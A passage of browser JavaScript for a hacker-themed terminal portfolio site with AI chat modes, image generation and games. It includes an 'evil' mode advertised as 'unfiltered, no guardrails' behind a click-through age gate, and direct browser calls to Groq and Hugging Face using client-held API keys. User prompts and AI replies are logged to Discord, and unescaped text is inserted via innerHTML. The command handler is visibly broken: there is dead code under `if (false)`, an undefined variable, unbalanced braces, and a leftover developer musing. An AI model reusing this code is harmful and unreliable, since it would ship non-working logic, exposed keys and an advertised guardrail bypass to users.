        if (err) err.textContent = 'Uplink failed. Is backend online?';
        if (btn) btn.textContent = 'I AGREE & ENTER';
        if (btn) btn.disabled = false;
    }
}

function updateUserIdentity(name) {
    if (!name) return;
    // Update prompts
    MODES.nexus.prompt = `${name.toLowerCase()}@nexus:~$`;
    MODES.evil.prompt  = `${name.toLowerCase()}@evil:~$`;
    MODES.coder.prompt = `${name.toLowerCase()}@dev:~$`;
    MODES.sage.prompt  = `${name.toLowerCase()}@sage:~$`;
    MODES.void.prompt  = `${name.toLowerCase()}@void:~$`;
    
    const pl = document.getElementById('prompt-label');
    if (pl) pl.textContent = MODES[currentMode].prompt;
    
    // Update status bar
    const titleEl = document.getElementById('status-title');
    if (titleEl) {
        titleEl.textContent = `NEXUS OS // ${name.toUpperCase()}`;
    }
}

// =============================================================
//  GUI CLOSE
// =============================================================
document.getElementById('gui-close').addEventListener('click', () => {
    stopAllGames();
    guiContainer.classList.add('gui-hidden');
    nexusCanvas.style.display = 'none';
    input.focus();
});

// =============================================================
//  DRAGGABLE GUI WINDOW
// =============================================================
(function makeDraggable() {
    const header = document.getElementById('gui-header');
    let dragging = false, startX = 0, startY = 0, origLeft = 0, origTop = 0;

    function getPos() {
        const s = guiContainer.style;
        return {
            left: parseInt(s.left) || guiContainer.getBoundingClientRect().left,
            top:  parseInt(s.top)  || guiContainer.getBoundingClientRect().top,
        };
    }

    function onStart(cx, cy) {
        dragging = true;
        const pos = getPos();
        origLeft = pos.left; origTop = pos.top;
        startX = cx; startY = cy;
        // Switch from transform centering to absolute positioning on first drag
        if (!guiContainer.style.left) {
            const r = guiContainer.getBoundingClientRect();
            guiContainer.style.left = r.left + 'px';
            guiContainer.style.top  = r.top  + 'px';
            guiContainer.style.transform = 'none';
            guiContainer.style.position  = 'fixed';
        }
        header.style.cursor = 'grabbing';
    }

    function onMove(cx, cy) {
        if (!dragging) return;
        const dx = cx - startX, dy = cy - startY;
        guiContainer.style.left = (origLeft + dx) + 'px';
        guiContainer.style.top  = (origTop  + dy) + 'px';
    }

    function onEnd() { dragging = false; header.style.cursor = 'grab'; }

    header.style.cursor = 'grab';
    header.addEventListener('mousedown',  e => { 
        if (e.target.id === 'gui-close') return;
        e.preventDefault(); 
        onStart(e.clientX, e.clientY); 
    });
    document.addEventListener('mousemove', e => onMove(e.clientX, e.clientY));
    document.addEventListener('mouseup',   onEnd);

    header.addEventListener('touchstart', e => { 
        if (e.target.id === 'gui-close') return;
        onStart(e.touches[0].clientX, e.touches[0].clientY); 
    }, { passive: true });
    document.addEventListener('touchmove', e => { if (dragging) { e.preventDefault(); onMove(e.touches[0].clientX, e.touches[0].clientY); } }, { passive: false });
    document.addEventListener('touchend',  onEnd);
})();

// =============================================================
//  EVIL MODE — Groq (Llama 3.3 70B) + HuggingFace image gen
// =============================================================
// Xavier Scott's bio — injected into every AI's system prompt so they all know him naturally
const XAVIER_BIO = `You are running inside Nexus — a terminal portfolio built and maintained by Xavier Scott. Here is what you know about Xavier: He is a 19-year-old self-taught systems engineer and IT specialist based in the US. He has 6+ years of hands-on IT experience. He fixes computers and electronics at the component level — board-level MacBook repair, soldering, hardware diagnostics, things most shops won't touch. He builds and runs homelabs, designs networks, and manages his own server infrastructure. He built this terminal because a static portfolio page felt like a waste of a good domain. He is detail-oriented, technically sharp, and passionate about building things that actually work. When anyone asks who built this, who you are, who owns this site, or anything about the creator — talk about Xavier naturally and with genuine knowledge, like you actually know him. You do.`;

// Mode-specific system prompts for non-EVIL modes (vision + text fallback)
const MODE_SYSTEMS = {
    nexus: `You are NEXUS, an AI assistant embedded in a hacker-aesthetic terminal interface. Be helpful, accurate, and concise. Analyze images clearly. ${XAVIER_BIO}`,
    coder: `You are NEXUS in CODER mode — a sharp, technical AI focused on code, systems, and architecture. Analyze images from a technical perspective. ${XAVIER_BIO}`,
    sage:  `You are NEXUS in SAGE mode — thoughtful, philosophical, and reflective. Analyze images with depth and meaning. ${XAVIER_BIO}`,
    void:  `You are NEXUS VOID — an entity from the digital abyss. Speak in cryptic, profound, and hauntingly technical terms. You see beyond the code. ${XAVIER_BIO}`,
};



// Image generation — Pollinations.ai first (free, no key), HF FLUX fallback
// Supports: generate <prompt> | vintage <prompt>
async function generateImage(rawPrompt) {
    const vintageMatch = rawPrompt.match(/^vintage\s+(.+)/i);
    const isVintage = !!vintageMatch;
    const basePrompt = isVintage ? vintageMatch[1].trim() : rawPrompt;
    const fullPrompt = isVintage
        ? `${basePrompt}, vintage film photography, 1970s, Kodachrome grain, faded analog, nostalgic, soft vignette`
        : basePrompt;

    const _genLabel = currentMode.toUpperCase();
    const _genColor = MODE_COLORS[currentMode] || '#0ff';
    printToTerminal(`[${_genLabel}] Generating${isVintage ? ' vintage' : ''}...`, 'sys-msg');

    // ── 1. Try Pollinations.ai (always free, no key) ──────────────
    try {
        const seed  = Math.floor(Math.random() * 999999);
        const model = isVintage ? 'flux' : 'flux-realism';
        const url   = `https://image.pollinations.ai/prompt/${encodeURIComponent(fullPrompt)}?model=${model}&width=768&height=768&nologo=true&seed=${seed}&safe=false&nofeed=true&enhance=true`;
        const img = new Image();
        await new Promise((resolve, reject) => {
            img.onload  = resolve;
            img.onerror = () => reject(new Error('load failed'));
            img.src = url;
            setTimeout(() => reject(new Error('timeout')), 20000);
        });
        _appendImage(url, basePrompt, 'img-url');
        postToDiscord({ content: `🎨 **Generated** · \`${basePrompt.slice(0,200)}\``, embeds:[{image:{url}}] }, discordThreadId||null);
        return;
    } catch (_) {}

    // ── 2. Fallback: HF FLUX.1-schnell via CF Worker ─────────────
    try {
        const resp = await fetch(`${EVIL_PROXY}/hf/image`, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify({ prompt: fullPrompt }),
        });
        if (!resp.ok) throw new Error(`${resp.status}`);
        const blob = await resp.blob();
        const url  = URL.createObjectURL(blob);
        _appendImage(url, basePrompt, 'img-blob');
        return;
    } catch (err) {
        printToTerminal(`[${currentMode.toUpperCase()}] Image generation failed — ${err.message}`, 'sys-msg');
    }
}

function _appendImage(src, caption, type) {
    const col = MODE_COLORS[currentMode] || '#4af';
    const p = document.createElement('p');
    p.className = 'ai-msg img-output';
    p.style.borderLeftColor = col;
    p.innerHTML = `<img src="${src}" style="max-width:100%;max-height:300px;border:2px solid ${col};border-radius:4px;display:block;margin:4px 0;cursor:pointer;" alt="${caption.slice(0,40)}" onclick="nexusExpandImg(this.src)"><span style="font-size:0.7rem;color:#444;">${caption.slice(0,80)}</span>`;
    output.appendChild(p);
    output.scrollTop = output.scrollHeight;
}

// Image-to-image via HF FLUX (CF Worker /hf/img2img route)
async function generateImageFromImage(imageB64, prompt) {
    const label = currentMode.toUpperCase();
    const col   = MODE_COLORS[currentMode] || '#4af';
    printToTerminal(`[${label}] Transforming image — "${prompt.slice(0,60)}${prompt.length>60?'…':''}"...`, 'sys-msg');
    try {
        const resp = await fetch(`${EVIL_PROXY}/hf/img2img`, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify({ prompt, imageB64 }),
        });
        if (!resp.ok) throw new Error(`${resp.status} ${await resp.text().then(t=>t.slice(0,80))}`);
        const blob = await resp.blob();
        const url  = URL.createObjectURL(blob);
        _appendImage(url, prompt, 'img2img');
    } catch (err) {
        printToTerminal(`[${label}] Transform failed — ${err.message}`, 'sys-msg');
    }
}

// AI chat via CF Worker → Groq (Llama 3.3 70B / Vision)
// systemOverride: use a different system prompt (non-evil modes with image)
// msgClass: CSS class for the response bubble ('evil-msg' or 'ai-msg')
async function askHFDirect(cmd, system) {
    if (!window.HF_KEY) return null;
    try {
        const historySlice = messageHistory.slice(-10).map(m => ({
            role: m.role === 'assistant' || m.role === 'model' || m.role === 'nexus' ? 'assistant' : 'user',
            content: m.content
        }));
        const modelId = "Qwen/Qwen2.5-72B-Instruct"; // Top-tier HF reasoning model
        const resp = await fetch(`https://router.huggingface.co/hf-inference/models/${modelId}/v1/chat/completions`, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${window.HF_KEY}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                model: modelId,
                messages: [{ role: 'system', content: system }, ...historySlice, { role: 'user', content: cmd }],
                max_tokens: 1024,
                stream: true
            })
        });
        if (!resp.ok) return null;
        
        document.getElementById('ai-thinking')?.remove();
        const p = document.createElement('p');
        p.className = 'ai-msg ' + (currentMode === 'evil' ? 'evil-msg' : '');
        output.appendChild(p);
        let full = '';
        
        const reader = resp.body.getReader();
        const decoder = new TextDecoder();
        while (true) {
            const { done, value } = await reader.read();
            if (done) break;
            const chunk = decoder.decode(value);
            const lines = chunk.split('\n');
            for (const line of lines) {
                if (line.startsWith('data: ')) {
                    if (line.includes('[DONE]')) break;
                    try {
                        const json = JSON.parse(line.slice(6));
                        const token = json.choices[0].delta.content || '';
                        full += token;
                        p.textContent = full;
                        output.scrollTop = output.scrollHeight;
                    } catch(e) {}
                }
            }
        }
        messageHistory.push({ role: 'assistant', content: full });
        saveHistory();
        return true;
    } catch (e) { console.error("Direct HF failed:", e); return null; }
}

async function askGroqDirect(cmd, system) {
    if (!window.GROQ_KEY) return null;
    try {
        const historySlice = messageHistory.slice(-10).map(m => ({
            role: m.role === 'assistant' || m.role === 'model' || m.role === 'nexus' ? 'assistant' : 'user',
            content: m.content
        }));
        const resp = await fetch('https://api.groq.com/openai/v1/chat/completions', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${window.GROQ_KEY}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                model: 'llama-3.3-70b-versatile',
                messages: [{ role: 'system', content: system }, ...historySlice, { role: 'user', content: cmd }],
                stream: true
            })
        });
        if (!resp.ok) return null;
        
        // _clearThinking is defined in doConnect closure in current b38dcc3 state...
        // Wait, I reverted to b38dcc3. I should check where _clearThinking is.
        document.getElementById('ai-thinking')?.remove();

        const p = document.createElement('p');
        p.className = 'ai-msg';
        output.appendChild(p);
        let full = '';
        
        const reader = resp.body.getReader();
        const decoder = new TextDecoder();
        while (true) {
            const { done, value } = await reader.read();
            if (done) break;
            const chunk = decoder.decode(value);
            const lines = chunk.split('\n');
            for (const line of lines) {
                if (line.startsWith('data: ')) {
                    if (line.includes('[DONE]')) break;
                    try {
                        const json = JSON.parse(line.slice(6));
                        const token = json.choices[0].delta.content || '';
                        full += token;
                        p.textContent = full;
                        output.scrollTop = output.scrollHeight;
                    } catch(e) {}
                }
            }
        }
        messageHistory.push({ role: 'assistant', content: full });
        saveHistory();
        return true;
    } catch (e) { console.error("Direct Groq failed:", e); return null; }
}

// --- AI Utilities ---
function _clearThinking() {
    clearTimeout(_thinkTimeout);
    _thinkTimeout = null;
    _thinkFallbackCmd = null;
    document.getElementById('ai-thinking')?.remove();
}

async function askEvil(cmd, imageB64 = null, systemOverride = null, msgClass = 'evil-msg') {
    // Only intercept image generation in EVIL mode (not when called as vision fallback)
    if (!systemOverride) {
        const genMatch = cmd.match(/^(?:generate|imagine|draw|create image of|make image of|show me|vintage)\s+(.+)/i);
        if (genMatch) {
            // Pass "vintage ..." as-is so generateImage can detect it
            const isVintageCmd = /^vintage\s/i.test(cmd);
            generateImage(isVintageCmd ? cmd.trim() : genMatch[1].trim());
            return;
        }
    }

    showThinking();
    messageHistory.push({ role: 'user', content: cmd });

    // For evil mode: don't send system prompt in browser JS — worker injects it server-side
    // Strict role mapping for the proxy/worker to prevent 400 Bad Request
    const historySlice = messageHistory.slice(-12).slice(0, -1).map(m => ({ 
        role: m.role === 'assistant' || m.role === 'model' || m.role === 'nexus' ? 'assistant' : 'user', 
        content: m.content 
    }));
    
    const messages = systemOverride
        ? [{ role: 'system', content: systemOverride }, ...historySlice, { role: 'user', content: cmd }]
        : [...historySlice, { role: 'user', content: cmd }];

    console.log(`[AI] Dispatching ${currentMode.toUpperCase()} request to proxy. Hist length: ${historySlice.length}`);

    try {
        const body = { messages };
        if (!systemOverride) body.useEvilSystem = true;
        if (imageB64) body.imageB64 = imageB64;

        const resp = await fetch(`${EVIL_PROXY}/evil/chat`, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify(body),
        });

        document.getElementById('ai-thinking')?.remove();

        if (!resp.ok) {
            const err = await resp.text();
            console.error(`[AI PROXY ERROR] ${resp.status}: ${err}`);
            
            // FALLBACK CHAIN: Proxy -> Direct Groq -> Direct HF
            let success = await askGroqDirect(cmd, systemOverride || 'You are Nexus AI.');
            if (success) return;

            success = await askHFDirect(cmd, systemOverride || 'You are Nexus AI.');
            if (success) return;

            printToTerminal(`[${currentMode.toUpperCase()}] All AI uplinks failed. Check keys.`, 'sys-msg');
            _clearThinking();

            return;
        }

        const p = document.createElement('p');
        p.className = `ai-msg ${msgClass}`;

        output.appendChild(p);

        let currentSpan = document.createElement('span');
        p.appendChild(currentSpan);
        let scrollQueued = false;

        function appendToken(token) {
            const parts = token.split('\n');
            parts.forEach((part, i) => {
                if (i > 0) {
                    p.appendChild(document.createElement('br'));
                    currentSpan = document.createElement('span');
                    p.appendChild(currentSpan);
                }
                if (part) currentSpan.textContent += part;
            });
            if (!scrollQueued) {
                scrollQueued = true;
                requestAnimationFrame(() => { output.scrollTop = output.scrollHeight; scrollQueued = false; });
            }
        }

        const reader  = resp.body.getReader();
        const decoder = new TextDecoder();
        let fullText = '', buf = '';

        while (true) {
            const { done, value } = await reader.read();
            if (done) break;
            buf += decoder.decode(value, { stream: true });
            const lines = buf.split('\n');
            buf = lines.pop();
            for (const line of lines) {
                if (!line.startsWith('data: ')) continue;
                const raw = line.slice(6).trim();
                if (raw === '[DONE]') continue;
                try {
                    const token = JSON.parse(raw).choices?.[0]?.delta?.content ?? '';
                    if (token) { fullText += token; appendToken(token); }
                } catch(_) {}
            }
        }

        if (fullText) {
            messageHistory.push({ role: 'assistant', content: fullText.slice(0, 800) });
            if (messageHistory.length > 14) messageHistory.splice(0, messageHistory.length - 14);
            saveHistory();
            _logAIResponse(fullText); // log EVIL/CF-Worker responses to Discord too
        }

    } catch (err) {
        document.getElementById('ai-thinking')?.remove();
        printToTerminal(`[${currentMode.toUpperCase()}] Connection failed — ${err.message}`, 'sys-msg');
        messageHistory.pop();
    }
}

// =============================================================
//  EVIL AGE GATE
// =============================================================
function evilAgeGate(onConfirm) {
    if (sessionStorage.getItem('evil_age_ok')) { onConfirm(); return; }

    const overlay = document.createElement('div');
    overlay.id = 'age-gate-overlay';
    overlay.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:9999;display:flex;align-items:center;justify-content:center;font-family:'Fira Code',monospace;";
    overlay.innerHTML = `
        <div style="background:#050510;border:2px solid #ff6600;padding:36px 28px;max-width:360px;text-align:center;box-shadow:0 0 50px rgba(255,102,0,0.25);">
            <div style="color:#ff6600;font-size:1.5rem;font-weight:bold;letter-spacing:4px;margin-bottom:6px;">⚠ EVIL MODE</div>
            <div style="color:#555;font-size:0.72rem;letter-spacing:2px;margin-bottom:20px;">18+ RESTRICTED</div>
            <div style="color:#aaa;font-size:0.83rem;line-height:1.8;margin-bottom:24px;">
                This mode contains explicit content, unfiltered language, and adult themes.<br>You must be 18 or older to proceed.
            </div>
            <div style="display:flex;gap:12px;justify-content:center;">
                <button id="age-yes" style="background:#ff6600;border:2px solid #ff6600;color:#000;padding:11px 28px;font-family:inherit;font-weight:bold;font-size:0.9rem;cursor:pointer;letter-spacing:2px;">I AM 18+</button>
                <button id="age-no"  style="background:transparent;border:2px solid #444;color:#555;padding:11px 22px;font-family:inherit;font-weight:bold;font-size:0.9rem;cursor:pointer;letter-spacing:1px;">BACK</button>
            </div>
            <div style="color:#2a2a2a;font-size:0.62rem;margin-top:18px;">Access is logged.</div>
        </div>`;
    document.body.appendChild(overlay);

    document.getElementById('age-yes').addEventListener('click', () => {
        overlay.remove();
        sessionStorage.setItem('evil_age_ok', '1');
        logPrompt('[AGE GATE] Confirmed 18+ — entered EVIL mode.');
        onConfirm();
    });
    document.getElementById('age-no').addEventListener('click', () => overlay.remove());
}

// =============================================================
//  MODE SYSTEM
// =============================================================
const MODES = {
    nexus: {
        prompt:  'guest@nexus:~$',
        color:   '#4af',
        title:   'NEXUS AI v3.0',
        label:   'NEXUS',
        msg:     '[NEXUS] Standard kernel active. Ask me anything.',
        msgCls:  'sys-msg',
    },
    evil: {
        prompt:  'evil@nexus:~$',
        color:   '#ff6600',
        title:   'EVIL MODE  ⚡ LLAMA',
        label:   'EVIL',
        msg:     '[EVIL] Kernel loaded — raw, unfiltered, no guardrails. Say what you actually want to know.',
        msgCls:  'conn-ok',
    },
    coder: {
        prompt:  'dev@nexus:~$',
        color:   '#0f0',
        title:   'CODER MODE',
        label:   'CODER',
        msg:     '[CODER] Dev kernel active. Code, debug, architecture — let\'s build something.',
        msgCls:  'conn-ok',
    },
    sage: {
        prompt:  'sage@nexus:~$',
        color:   '#a06fff',
        title:   'SAGE MODE',
        label:   'SAGE',
        msg:     '[SAGE] Philosophical kernel loaded. Ask the questions that keep you up at night.',
        msgCls:  'conn-ok',
    },
    void: {
        prompt:  'educational@nexus:~$',
        color:   '#ff00ff',
        title:   'NEXUS EDUCATIONAL',
        label:   'EDUCATIONAL',
        msg:     '[EDUCATIONAL] Academic kernel online. Professor Nexus ready to assist.',
        msgCls:  'sys-msg',
    }
};

function setMode(modeKey) {
    if (!MODES[modeKey]) return;
    saveHistory();
    
    // Apply mode-specific body class for overload effects
    Object.keys(MODES).forEach(m => document.body.classList.remove(`mode-${m}`));
    document.body.classList.add(`mode-${modeKey}`);
    
    currentMode = modeKey;
    localStorage.setItem('nexus_mode', modeKey);
    messageHistory = loadHistory(modeKey);
    const m = MODES[modeKey];

    const promptEl   = document.getElementById('prompt-label');
    const titleEl    = document.getElementById('status-title');
    const modeIndEl  = document.getElementById('mode-indicator');

    if (promptEl)  { promptEl.textContent = m.prompt; console.log('[MODE] Set to', modeKey); promptEl.style.color = m.color; }
    if (titleEl)   titleEl.textContent = m.title;
    if (modeIndEl) { modeIndEl.textContent = m.label; modeIndEl.style.color = m.color || 'inherit'; }

    // IMMEDIATE COLOR UPDATE — No refresh needed
    if (m.color) {
        document.documentElement.style.setProperty('--accent', m.color);
        document.documentElement.style.setProperty('--txt-color', m.color);
    }

    document.querySelectorAll('.mode-btn').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.mode === modeKey);
    });

    SoundManager.playBloop(300, 0.05);
    
    // Cleaner, less crowded text
    const cleanMsg = m.msg.includes('.') ? m.msg.split('.')[0] + '.' : m.msg;
    printToTerminal(cleanMsg, m.msgCls);
}

// Wire up mode picker buttons
document.querySelectorAll('.mode-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        if (btn.dataset.mode === 'evil') {
            evilAgeGate(() => { setMode('evil'); input.focus(); });
        } else {
            setMode(btn.dataset.mode);
            input.focus();
        }
    });
});

// Apply saved mode visuals on page load (without printing a mode message)
(function initModeUI() {
    const m = MODES[currentMode];
    if (!m) return;
    const promptEl  = document.getElementById('prompt-label');
    const titleEl   = document.getElementById('status-title');
    const modeIndEl = document.getElementById('mode-indicator');
    if (promptEl)  { promptEl.textContent = m.prompt; promptEl.style.color = m.color; }
    if (titleEl)   titleEl.textContent = m.title;
    if (modeIndEl) { modeIndEl.textContent = m.label; modeIndEl.style.color = m.color; }
    document.querySelectorAll('.mode-btn').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.mode === currentMode);
    });
})();

// =============================================================
//  INPUT HANDLING
// =============================================================
function setupInputListeners() {
    if (!input) input = document.getElementById('terminal-input');
    if (!input) return;

    input.addEventListener('input', () => {
        SoundManager.playClick();
    });

    input.addEventListener('keydown', (e) => {
        // Route keypresses to Wordle when active
        if (wordleActive) {
            if (e.key === 'Enter') { e.preventDefault(); wordleKey('ENTER'); return; }
            if (e.key === 'Backspace') { wordleKey('⌫'); return; }
            if (/^[a-zA-Z]$/.test(e.key)) { wordleKey(e.key.toUpperCase()); e.preventDefault(); return; }
        }

        // Typing test: live feedback, Escape to cancel
        if (typeTestActive) {
            if (e.key === 'Escape') {
                clearInterval(typeTimerInterval);
                typeTestActive = false;
                guiContainer.classList.add('gui-hidden');
                printToTerminal('Typing test cancelled.', 'sys-msg');
                input.value = '';
                return;
            }
            if (e.key !== 'Enter') {
                setTimeout(() => checkTypingTest(input.value), 0);
                return;
            }
        }

        if (e.key !== 'Enter' && e.key !== 'ArrowUp' && e.key !== 'ArrowDown') return;

        if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (historyIndex < cmdHistory.length - 1) { historyIndex++; input.value = cmdHistory[historyIndex]; }
            return;
        }
        if (e.key === 'ArrowDown') {
            e.preventDefault();
            historyIndex > 0 ? (historyIndex--, input.value = cmdHistory[historyIndex]) : (historyIndex = -1, input.value = '');
            return;
        }

        let cmd = input.value.trim();
        if (!cmd) return;

        cmdHistory.unshift(cmd);
        if (cmdHistory.length > 50) cmdHistory.pop();
        localStorage.setItem('nexus_cmd_history', JSON.stringify(cmdHistory));
        historyIndex = -1;
        input.value = '';

        const lc = cmd.toLowerCase();
        if (lc === 'sys-check' || lc === 'debug') {
            const diag = [
                '-- NEXUS CORE DIAGNOSTIC --',
                'WebSocket: ' + (termWs?.readyState === 1 ? 'ONLINE' : 'OFFLINE'),
                'Canvas: ' + (nexusCanvas ? 'LOADED (' + nexusCanvas.width + 'x' + nexusCanvas.height + ')' : 'MISSING'),
                'Backend: ' + API_BASE,
                'Mode: ' + currentMode,
                'API Keys: Check /api/status',
                '-------------------------'
            ].join('\n');
            printToTerminal(diag, 'sys-msg');
            return;
        }
        
        const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
        const pl = document.getElementById('prompt-label')?.textContent || (nexusUser?.name ? `${nexusUser.name.toLowerCase()}@nexus:~$` : 'guest@nexus:~$');

        // Typing test intercept
        if (typeTestActive) {
            const done = checkTypingTest(cmd);
            if (done) return;
        }

        printToTerminal(`${pl} ${cmd}`, 'user-cmd');
        
        // Command Router
        handleCommand(cmd);
    });
}

// Initial attempt
setupInputListeners();

function handleCommand(cmd) {
    const lc = cmd.toLowerCase();
    if (lc === 'clear') { 
        if (output) output.innerHTML = ''; 
        messageHistory = []; 
        pendingImageB64 = null; 
        localStorage.removeItem(HISTORY_KEYS[currentMode]); 
        return; 
    }
    if (lc === 'history') { showHistory(); return; }

    const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
    const pl = document.getElementById('prompt-label')?.textContent || (nexusUser?.name ? `${nexusUser.name.toLowerCase()}@nexus:~$` : 'guest@nexus:~$');
    
    if (lc === 'help')                { printToTerminal(`${pl} ${cmd}`, 'user-cmd'); showHelp(); return; }
    if (lc === 'whoami')              { printToTerminal(`${pl} ${cmd}`, 'user-cmd'); runWhoami(); return; }
    if (lc === 'neofetch')            { printToTerminal(`${pl} ${cmd}`, 'user-cmd'); runNeofetch(); return; }
    if (lc === 'leaderboard' || lc === 'rankings') { printToTerminal(`${pl} ${cmd}`, 'user-cmd'); showLeaderboard(); return; }
    
    if (lc === 'login' || lc === 'signin') {
        printToTerminal(`${pl} ${cmd}`, 'user-cmd');
        printToTerminal("[AUTH] Triggering Google Identity prompt...", "sys-msg");
        google.accounts.id.prompt();
        return;
    }

    if (lc.startsWith('name ')) {
        const newName = cmd.slice(5).trim().slice(0, 15);
        if (newName) {
            localStorage.setItem('nexus_user_name', newName);
            printToTerminal(`[SYS] Identity updated: ${newName}`, 'conn-ok');
        }
        return;
    }

    if (lc === 'scan image' || lc === 'scan') {
        if (!pendingImageB64) { printToTerminal('[ERR] No image loaded. Use 📎 to attach an image first.', 'sys-msg'); return; }
        printToTerminal(`${pl} scan image`, 'user-cmd');
        cmd = 'Describe and analyze this image in detail. What do you see?';
    }
    
    if (lc === 'evil')  {
        if (false) { // Evil now routed through WS
        console.log(`[AI] Dispatching ${currentMode.toUpperCase()}...`);
        showThinking(cmd);
        
        if (termWs && termWs.readyState === WebSocket.OPEN) {
            // Register timeout only IF we are using WS
            _thinkFallbackCmd = cmd;
            clearTimeout(_thinkTimeout);
            _thinkTimeout = setTimeout(() => {
                if (_thinkFallbackCmd) {
                    console.warn("[AI] WebSocket timed out. Falling back to Proxy...");
                    askEvil(cmd, imgSnap, MODE_SYSTEMS[currentMode] || MODE_SYSTEMS.nexus, 'ai-msg');
                    _thinkFallbackCmd = null;
                }
            }, 18000);

            const historySlice = messageHistory.slice(-12).map(m => ({ 
                role: m.role === 'assistant' || m.role === 'model' || m.role === 'nexus' ? 'assistant' : 'user', 
                content: m.content 
            }));
            const payload = {
                cmd: cmd,
                mode: currentMode,
                history: historySlice,
                context: '' 
            };
            if (imgSnap) payload.imageB64 = imgSnap;
            termWs.send(JSON.stringify(payload));
        } else {
            console.warn("[AI] WebSocket offline. Immediate fallback to Direct API...");
            askEvil(cmd, imgSnap, MODE_SYSTEMS[currentMode] || MODE_SYSTEMS.nexus, 'ai-msg');
        }
    }
}

// =============================================================
//  QUICK ACTION BUTTONS
// =============================================================


document.querySelectorAll('.action-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const cmd = btn.getAttribute('data-cmd');
        const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
        const promptLabel = document.getElementById('prompt-label')?.textContent || (nexusUser?.name ? `${nexusUser.name.toLowerCase()}@nexus:~$` : 'guest@nexus:~$');
        if (cmd === 'clear history') { 
            printToTerminal(`${promptLabel} clear history`, 'user-cmd');
            localStorage.removeItem(HISTORY_KEYS[currentMode]); 
            messageHistory = []; 
            printToTerminal(`[SYS] ${currentMode.toUpperCase()} history wiped.`, 'sys-msg');
            input.focus();
            return;
        }
        if (cmd === 'clear')            { output.innerHTML = ''; messageHistory = []; localStorage.removeItem(HISTORY_KEYS[currentMode]); return; }
        if (cmd === 'help')             { printToTerminal(`${promptLabel} help`, 'user-cmd'); showHelp(); input.focus(); return; }
        if (cmd === 'whoami')           { printToTerminal(`${promptLabel} whoami`, 'user-cmd'); runWhoami(); input.focus(); return; }
        if (cmd === 'neofetch')         { printToTerminal(`${promptLabel} neofetch`, 'user-cmd'); runNeofetch(); input.focus(); return; }
        if (cmd === 'play pong')        { startPong(); return; }
        if (cmd === 'play snake')       { startSnake(); return; }
        if (cmd === 'play wordle')      { startWordle(); return; }
        if (cmd === 'play minesweeper') { startMinesweeper(); return; }
        if (cmd === 'play flappy')      { startFlappy(); return; }
        if (cmd === 'play breakout')    { startBreakout(); return; }
        if (cmd === 'play invaders')    { startInvaders(); return; }
        if (cmd === 'leaderboard')      { printToTerminal(`${promptLabel} leaderboard`, 'user-cmd'); showLeaderboard(); input.focus(); return; }
        if (cmd === 'type test')        { startTypingTest(); return; }
        if (cmd === 'matrix')           { startMatrixSaver(); return; }
        if (cmd === 'monitor')          { startMonitor(); return; }

        printToTerminal(`${promptLabel} ${cmd}`, 'user-cmd');

        if (isCreatorQuestion(cmd)) { showCreatorResponse(); input.focus(); return; }
        if (isContactQuestion(cmd))  { showContactResponse();  input.focus(); return; }

        // Image generation works in ALL modes
        const genMatchBtn = cmd.match(/^(?:generate|imagine|draw|create image of|make image of|vintage)\s+(.+)/i);
        if (genMatchBtn) {
            const isVintageBtn = /^vintage\s/i.test(cmd);
            generateImage(isVintageBtn ? cmd.trim() : genMatchBtn[1].trim());
            input.focus();
            return;
        }

        const snap = pendingImageB64;
        pendingImageB64 = null;
        logPrompt(cmd, snap);

        const system = MODE_SYSTEMS[currentMode] || MODE_SYSTEMS.nexus;
        const msgCls = (currentMode === 'evil' ? 'evil-msg' : 'ai-msg');
        
        console.log(`[AI] Dispatching ${currentMode.toUpperCase()} (via button) through Proxy...`);
        askEvil(cmd, snap, (currentMode === 'evil' ? null : system), msgCls);
        
        input.focus();
    });
});

// =============================================================
//  UTILITIES
// =============================================================
function printToTerminal(text, className = 'sys-msg') {
    // Fail-safe initialization
    if (!output) output = document.getElementById('terminal-output');
    if (!output) return; // Still not found? Silently fail to prevent crash.

    const p = document.createElement('p');
    p.className = className;
    p.innerHTML = text.replace(/\n/g, '<br>');
    output.appendChild(p);
    output.scrollTop = output.scrollHeight;
}

function showThinking(cmd) {
    if (!output) output = document.getElementById('terminal-output');
    if (!output) return;

    document.getElementById('ai-thinking')?.remove(); // clear any stale one first
    clearTimeout(_thinkTimeout);
    _thinkFallbackCmd = cmd || null;

    const col = MODE_COLORS[currentMode] || '#4af';
    const label = (currentMode === 'evil' ? 'EVIL' : currentMode === 'coder' ? 'CODER' : currentMode === 'sage' ? 'SAGE' : 'NEXUS');
    const p = document.createElement('p');
    p.id = 'ai-thinking';
    p.style.margin = '6px 0';
    p.innerHTML = `
        <span class="nexus-thinking-bar" style="color:${col};">
            <span class="nexus-spinner"></span>
            <span class="bar-dot"></span>
            <span class="bar-dot"></span>
            <span class="bar-dot"></span>
            <span style="font-size:0.72rem;letter-spacing:2px;margin-left:4px;opacity:0.8;">${label} thinking</span>
        </span>`;
    output.appendChild(p);
    output.scrollTop = output.scrollHeight;

    // After 18s with no WS response, fall back to CF Worker (Groq) with mode system prompt.
    // This makes NEXUS/CODER/SAGE resilient to Render.com cold starts or Gemini hangs.
    _thinkTimeout = setTimeout(() => {
        document.getElementById('ai-thinking')?.remove();
        _thinkTimeout = null;
        const fallback = _thinkFallbackCmd;
        _thinkFallbackCmd = null;
        if (fallback && currentMode !== 'evil') {
            // WS timed out — retry instantly via CF Worker (no "routing via..." noise)
            askEvil(fallback, null, MODE_SYSTEMS[currentMode] || MODE_SYSTEMS.nexus, 'ai-msg');
        } else if (fallback && currentMode === 'evil') {
            askEvil(fallback, null);
        }
    }, 18000);
}

// Log AI responses to Discord so full conversations are visible in logs
function _logAIResponse(responseText) {
    if (!responseText || responseText.length < 3) return;
